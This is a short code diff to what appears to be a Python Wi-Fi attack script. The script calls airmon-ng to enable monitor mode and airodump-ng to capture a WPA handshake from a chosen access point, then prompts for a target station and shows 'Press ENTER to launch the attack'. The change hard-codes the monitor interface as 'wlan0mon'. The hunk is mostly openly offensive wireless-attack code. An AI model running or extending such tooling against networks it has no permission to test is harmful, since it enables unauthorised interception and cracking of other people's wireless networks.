@@ -151,10 +151,10 @@ elif(attack == __method__[5]):
 	os.system('xterm -fg green -e airmon-ng start %s' % (network_interface))
 	
 	os.system('clear')
-	os.system('airodump-ng -c %s --bssid %s -w psk %s' % (choice.channel, choice.address, network_interface))
+	os.system('airodump-ng -c %s --bssid %s -w psk wlan0mon' % (choice.channel, choice.address))
 	bssid = raw_input('Enter the Station here: ')
 
-	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: {}\nStation: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, network_interface, bssid), 'green', attrs=['bold'])
+	network_info = colored('Network Name: {}\nBSSID: {}\nChannel: {}\nInterface: wlan0mon\nStation: {}\nPress ENTER to launch the attack'.format(choice.ssid, choice.address, choice.channel, bssid), 'green', attrs=['bold'])
 	os.system('clear')
 	for char in network_info:
 		sleep(0.05)
